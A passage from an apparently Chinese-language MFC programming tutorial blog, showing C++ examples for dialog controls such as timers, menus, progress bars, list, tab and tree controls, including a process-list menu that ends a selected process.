class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy01StdControlsTestDlg::OnBnClickedButton7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CString str ;</span><br><span class="line">UpdateData(TRUE);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nNum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">str.Format(_T(<span class="string">&quot;测试文本%d\r\n&quot;</span>), nNum);</span><br><span class="line">nNum++;</span><br><span class="line"><span class="comment">/*str+=m_objEdit2;</span></span><br><span class="line"><span class="comment">m_objEdit2 = str;*/</span></span><br><span class="line">m_strEdit2 += str;</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">DWORD  dwCount = m_objEdit.GetLineCount();</span><br><span class="line">m_objEdit.LineScroll(dwCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="静态文本框"><a href="#静态文本框" class="headerlink" title="静态文本框"></a>静态文本框</h3><p>绑定变量之后，可以方便的去更改内容。</p><p>例子：动态刷新鼠标坐标</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy01StdControlsTestDlg::OnMouseMove</span><span class="params">(UINT nFlags, CPoint point)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"></span><br><span class="line">m_strStatic.Format(_T(<span class="string">&quot;x坐标为%d，y坐标为%d&quot;</span>),point.x, point.y);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">CDialogEx::OnMouseMove(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图片控件与计时器"><a href="#图片控件与计时器" class="headerlink" title="图片控件与计时器"></a>图片控件与计时器</h3><p>计时器：能够让咱们程序，每间隔一个固定的时间，去处理一个事情。</p><p>SDK：响应这个WM_TIMER消息   SetTimer()</p><p>MFC: 在窗口初始化的时候，去调用一下SetTimer这个函数</p><p>要手动在initDialog初始化函数中设置计时器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 设置计时器</span><br><span class="line">SetTimer(</span><br><span class="line">1,   &#x2F;&#x2F;自定义的Timer的ID</span><br><span class="line">500, &#x2F;&#x2F;间隔的毫秒数</span><br><span class="line">NULL &#x2F;&#x2F;回调函数，如果设置了，每隔500毫秒调这个回调函数</span><br><span class="line"> &#x2F;&#x2F;如果没有设置，就是给主窗口发WM_TIMER消息</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>响应计时器OnTimer函数可在类向导中添加</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMy01StdControlsTestDlg::OnTimer</span><span class="params">(UINT_PTR nIDEvent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加消息处理程序代码和/或调用默认值</span></span><br><span class="line"><span class="keyword">if</span> (nIDEvent == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">CString str;</span><br><span class="line">UpdateData(TRUE);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nNum = <span class="number">0</span>;</span><br><span class="line">str.Format(_T(<span class="string">&quot;测试文本%d\r\n&quot;</span>), nNum);</span><br><span class="line">nNum++;</span><br><span class="line"><span class="comment">/*str+=m_objEdit2;</span></span><br><span class="line"><span class="comment">m_objEdit2 = str;*/</span></span><br><span class="line">m_strEdit2 += str;</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line">DWORD  dwCount = m_objEdit.GetLineCount();</span><br><span class="line">m_objEdit.LineScroll(dwCount);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(nIDEvent == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> BOOL bSign = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1 加载位图资源</span></span><br><span class="line">CBitmap Bit1;</span><br><span class="line">Bit1.LoadBitmapW(IDB_BITMAP1);</span><br><span class="line">CBitmap Bit2;</span><br><span class="line">Bit2.LoadBitmapW(IDB_BITMAP2);</span><br><span class="line"><span class="keyword">if</span> (bSign == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">m_objPic.SetBitmap(Bit1);</span><br><span class="line">bSign = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">m_objPic.SetBitmap(Bit2);</span><br><span class="line">bSign = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">CDialogEx::OnTimer(nIDEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="下拉框"><a href="#下拉框" class="headerlink" title="下拉框"></a>下拉框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nNum = <span class="number">0</span>;</span><br><span class="line">CString str;</span><br><span class="line">str.Format(<span class="string">L&quot;测试文本%d&quot;</span>, nNum);</span><br><span class="line">nNum++;</span><br><span class="line">m_strComBox1 = str;</span><br><span class="line">m_ComBox1.AddString(str);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><h4 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void CMy03MenuDlg::OnRButtonDown(UINT nFlags, CPoint point)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; TODO: 在此添加消息处理程序代码和&#x2F;或调用默认值</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1 需要将客户区坐标转换为屏幕坐标</span><br><span class="line"></span><br><span class="line">ClientToScreen(&amp;point);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2 需要载入菜单资源</span><br><span class="line">CMenu obj;</span><br><span class="line"></span><br><span class="line">obj.LoadMenuW(IDR_MENU2);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;3 获取一个下拉菜单</span><br><span class="line">CMenu * pSubMenu1 &#x3D; obj.GetSubMenu(0);</span><br><span class="line">pSubMenu1-&gt;AppendMenuW(MF_ENABLED, 32783, _T(&quot;添加线程&quot;));</span><br><span class="line">&#x2F;&#x2F;4 弹出菜单</span><br><span class="line">pSubMenu1-&gt;TrackPopupMenu(TPM_LEFTALIGN, point.x, point.y, this);</span><br><span class="line"></span><br><span class="line">CDialogEx::OnRButtonDown(nFlags, point);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="弹出菜单"><a href="#弹出菜单" class="headerlink" title="弹出菜单"></a>弹出菜单</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//右击列表框（进程选项下的列表框）弹出菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDlg1::OnRclickList1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMITEMACTIVATE pNMItemActivate = <span class="keyword">reinterpret_cast</span>&lt;LPNMITEMACTIVATE&gt;(pNMHDR);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要载入菜单资源</span></span><br><span class="line">CMenu obj;</span><br><span class="line">obj.LoadMenuW(IDR_MENU1);</span><br><span class="line"><span class="comment">//坐标转换</span></span><br><span class="line">POINT pt = &#123; pNMItemActivate-&gt;ptAction.x,pNMItemActivate-&gt;ptAction.y &#125;;</span><br><span class="line">ClientToScreen(&amp;pt);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取一个下拉菜单</span></span><br><span class="line">CMenu* pSubMenu1 = obj.GetSubMenu(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 弹出菜单</span></span><br><span class="line">pSubMenu1-&gt;TrackPopupMenu(TPM_LEFTALIGN,pt.x, pt.y, <span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//获取ID（选择的进程）</span></span><br><span class="line"><span class="keyword">int</span> item = pNMItemActivate-&gt;iItem;  <span class="comment">//LPNMITEMACTIVATF 这个结构体 iItem 有列表框记录的信息</span></span><br><span class="line">CString strPid = m_ProcessList.GetItemText(item, <span class="number">1</span>);  <span class="comment">//获取文本框</span></span><br><span class="line">nID = _wtoi(strPid);<span class="comment">//转换为整型并保存</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* cs = &#123; <span class="string">&quot;右击了进程！！！&quot;</span> &#125;;</span><br><span class="line">SendDiyMessage(cs);</span><br><span class="line">*pResult = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程列表框下右击响应菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDlg1::OnRangeCmds1</span><span class="params">(UINT nMenuID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* cs;</span><br><span class="line"><span class="comment">// 使用 PID 获取到进程的句柄</span></span><br><span class="line">HANDLE Process = OpenProcess(PROCESS_TERMINATE, FALSE, nID);</span><br><span class="line"><span class="keyword">switch</span> (nMenuID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ID_32771:<span class="comment">//创建进程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ID_32772:<span class="comment">//结束进程</span></span><br><span class="line"><span class="comment">// 通过句柄来结束一个指定进程</span></span><br><span class="line">TerminateProcess(Process, <span class="number">-1</span>);</span><br><span class="line">cs = &#123; <span class="string">&quot;结束了一个进程！！！&quot;</span> &#125;;</span><br><span class="line">SendDiyMessage(cs);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通用控件（复杂控件）"><a href="#通用控件（复杂控件）" class="headerlink" title="通用控件（复杂控件）"></a>通用控件（复杂控件）</h2><h3 id="滑块"><a href="#滑块" class="headerlink" title="滑块"></a>滑块</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//移动滑块把值显示在下方静态文本</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCAppTestDlg::OnNMCustomdrawSlider1</span><span class="params">(NMHDR* pNMHDR, LRESULT* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPNMCUSTOMDRAW pNMCD = <span class="keyword">reinterpret_cast</span>&lt;LPNMCUSTOMDRAW&gt;(pNMHDR);</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">UpdateData(TRUE);</span><br><span class="line">CString str;</span><br><span class="line">str.Format(<span class="string">L&quot;滑块的值为：%d&quot;</span>, m_Huakuai1);</span><br><span class="line">m_strStaticText2.SetString(str);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="comment">//*pResult = 0;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进度条"><a href="#进度条" class="headerlink" title="进度条"></a>进度条</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//增加进度条进度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCAppTestDlg::OnBnClickedButton6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> addProess = <span class="number">0</span>;</span><br><span class="line">addProess=m_objProgress2.GetPos();</span><br><span class="line">addProess += <span class="number">10</span>;</span><br><span class="line">m_objProgress2.SetPos(addProess);</span><br><span class="line"><span class="keyword">if</span> (addProess == <span class="number">100</span>)</span><br><span class="line">addProess = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//减少进度条进度</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCAppTestDlg::OnBnClickedButton7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">UpdateData(TRUE);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> delProcess = <span class="number">0</span>;</span><br><span class="line">delProcess=m_objProgress2.GetPos();</span><br><span class="line">delProcess -= <span class="number">10</span>;</span><br><span class="line">m_objProgress2.SetPos(delProcess);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="列表框"><a href="#列表框" class="headerlink" title="列表框"></a>列表框</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化列表框的列</span></span><br><span class="line"><span class="comment">//初始化列表框LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES</span></span><br><span class="line">m_objCtrlList1.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_CHECKBOXES);<span class="comment">//更改风格</span></span><br><span class="line">m_objCtrlList1.InsertColumn(<span class="number">0</span>, <span class="string">L&quot;姓名&quot;</span>, <span class="number">0</span>, <span class="number">90</span>);</span><br><span class="line">m_objCtrlList1.InsertColumn(<span class="number">1</span>, <span class="string">L&quot;年龄&quot;</span>, <span class="number">0</span>, <span class="number">90</span>);</span><br><span class="line">m_objCtrlList1.InsertColumn(<span class="number">2</span>, <span class="string">L&quot;身高&quot;</span>, <span class="number">0</span>, <span class="number">90</span>);</span><br><span class="line">m_objCtrlList1.InsertColumn(<span class="number">3</span>, <span class="string">L&quot;体重&quot;</span>, <span class="number">0</span>, <span class="number">90</span>);</span><br><span class="line"><span class="comment">//添加行</span></span><br><span class="line">m_objCtrlList1.InsertItem( <span class="number">0</span>, <span class="string">L&quot;&quot;</span>);<span class="comment">//</span></span><br><span class="line">m_objCtrlList1.SetItemText(<span class="number">0</span>,<span class="number">0</span>,<span class="string">L&quot;小米&quot;</span>);</span><br><span class="line">m_objCtrlList1.SetItemText(<span class="number">0</span>, <span class="number">1</span>, <span class="string">L&quot;14&quot;</span>);</span><br><span class="line">m_objCtrlList1.SetItemText(<span class="number">0</span>, <span class="number">2</span>, <span class="string">L&quot;122&quot;</span>);</span><br><span class="line">m_objCtrlList1.SetItemText(<span class="number">0</span>, <span class="number">3</span>, <span class="string">L&quot;23&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Tab控件"><a href="#Tab控件" class="headerlink" title="Tab控件"></a>Tab控件</h3><p>封装函数拿走</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyTabCtrl::InitTab</span><span class="params">(<span class="keyword">int</span> nCount, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">va_list  vl;</span><br><span class="line">va_start(vl, nCount);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1 获取这一个选项，需要的数据</span></span><br><span class="line"><span class="keyword">wchar_t</span>* szTabItemName = va_arg(vl, <span class="keyword">wchar_t</span>*);</span><br><span class="line">CDialogEx* pDlg = va_arg(vl, CDialogEx*);</span><br><span class="line">DWORD dwId = va_arg(vl, DWORD);</span><br><span class="line"><span class="comment">//2 创建选项，创建子窗口</span></span><br><span class="line">InsertItem(i, szTabItemName);</span><br><span class="line">pDlg-&gt;Create(dwId, <span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//3 将子窗口移动合适的位置上</span></span><br><span class="line">CRect rc = &#123;&#125;;</span><br><span class="line">GetClientRect(&amp;rc);</span><br><span class="line"><span class="comment">//4 将矩形框，缩小一下，能够把Tab的表头 显示出来</span></span><br><span class="line">rc.DeflateRect(<span class="number">1</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//5 移动</span></span><br><span class="line">pDlg-&gt;MoveWindow(rc);</span><br><span class="line">m_vecDlg.push_back(pDlg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">m_vecDlg[<span class="number">0</span>]-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">va_end(vl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化tab控件中的窗口</span></span><br><span class="line">m_MainTabCtrl.InitTab(<span class="number">4</span>, <span class="string">L&quot;进程&quot;</span>, <span class="keyword">new</span> CMyDlg1(), IDD_DIALOG1,</span><br><span class="line"> <span class="string">L&quot;VS清理&quot;</span>, <span class="keyword">new</span> CMyDlg2(), IDD_DIALOG2,</span><br><span class="line"> <span class="string">L&quot;窗口&quot;</span>, <span class="keyword">new</span> CMyDlg3(),IDD_DIALOGWND,</span><br><span class="line"> <span class="string">L&quot;计算机总览&quot;</span>, <span class="keyword">new</span> CMyTreeDlg(), IDD_DIALOGTREE</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h3 id="树控件"><a href="#树控件" class="headerlink" title="树控件"></a>树控件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">HTREEITEM hBj = m_objTree.InsertItem(_T(<span class="string">&quot;北京&quot;</span>));<span class="comment">//添加一个信息之后，会得到此结点的句柄</span></span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;昌平区&quot;</span>), hBj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;朝阳区&quot;</span>), hBj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;海淀区&quot;</span>), hBj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;东城区&quot;</span>), hBj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;西城区&quot;</span>), hBj);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTREEITEM hTj = m_objTree.InsertItem(_T(<span class="string">&quot;天津&quot;</span>));</span><br><span class="line">HTREEITEM hDl = m_objTree.InsertItem(_T(<span class="string">&quot;东丽区&quot;</span>), hTj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;天安象屿智慧城&quot;</span>), hDl);</span><br><span class="line"></span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;南开区&quot;</span>), hTj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;河西区&quot;</span>), hTj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;河东区&quot;</span>), hTj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;北辰区&quot;</span>), hTj);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;和平区&quot;</span>), hTj);</span><br><span class="line"></span><br><span class="line">HTREEITEM hHb = m_objTree.InsertItem(_T(<span class="string">&quot;河北&quot;</span>));</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;石家庄&quot;</span>), hHb);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;廊坊&quot;</span>), hHb);</span><br><span class="line">m_objTree.InsertItem(_T(<span class="string">&quot;雄安新区&quot;</span>), hHb);</span><br></pre></td></tr></table></figure><h4 id="使用案例-遍历硬盘"><a href="#使用案例-遍历硬盘" class="headerlink" title="使用案例-遍历硬盘"></a>使用案例-遍历硬盘</h4><p>.h头文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;vector&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &quot;CMyFilePopDlg.h&quot;</span><br><span class="line">using std::vector;</span><br><span class="line">&#x2F;&#x2F; CMyTreeDlg 对话框</span><br><span class="line">typedef struct _MYDISKHEADINFO</span><br><span class="line">&#123;</span><br><span class="line">CString csDiskHead; &#x2F;&#x2F;盘符</span><br><span class="line">UINT uAllSize; &#x2F;&#x2F;盘符总大小</span><br><span class="line">UINT uAbouleSize; &#x2F;&#x2F;盘符可用大小</span><br><span class="line">UINT uUsed; &#x2F;&#x2F;已经用了多少</span><br><span class="line">CString attribute; &#x2F;&#x2F;盘符属性</span><br><span class="line"></span><br><span class="line">&#125;MyDiskHeadInfo,*pDisk;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class CMyTreeDlg : public CDialogEx</span><br><span class="line">&#123;</span><br><span class="line">DECLARE_DYNAMIC(CMyTreeDlg)</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">CMyTreeDlg(CWnd* pParent &#x3D; nullptr);   &#x2F;&#x2F; 标准构造函数</span><br><span class="line">virtual ~CMyTreeDlg();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 对话框数据</span><br><span class="line">#ifdef AFX_DESIGN_TIME</span><br><span class="line">enum &#123; IDD &#x3D; IDD_DIALOGTREE &#125;;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">protected:</span><br><span class="line">virtual void DoDataExchange(CDataExchange* pDX);    &#x2F;&#x2F; DDX&#x2F;DDV 支持</span><br><span class="line"></span><br><span class="line">DECLARE_MESSAGE_MAP()</span><br><span class="line">public:</span><br><span class="line">CTreeCtrl m_objTree;</span><br><span class="line"></span><br><span class="line">CImageList  m_ImageList;</span><br><span class="line">vector&lt;_MYDISKHEADINFO *&gt;Disk;</span><br><span class="line"></span><br><span class="line">virtual BOOL OnInitDialog();</span><br><span class="line">void GetDistHeadInfo();&#x2F;&#x2F;遍历盘符</span><br><span class="line">HTREEITEM m_Root;</span><br><span class="line">CString GetFullPath(HTREEITEM hCurrent);</span><br><span class="line">void AddSubDir(HTREEITEM hParent);</span><br><span class="line">;</span><br><span class="line">afx_msg void OnDblclkTree1(NMHDR* pNMHDR, LRESULT* pResult);</span><br><span class="line"></span><br><span class="line">afx_msg void OnSelchangedTree1(NMHDR* pNMHDR, LRESULT* pResult);</span><br><span class="line">protected:</span><br><span 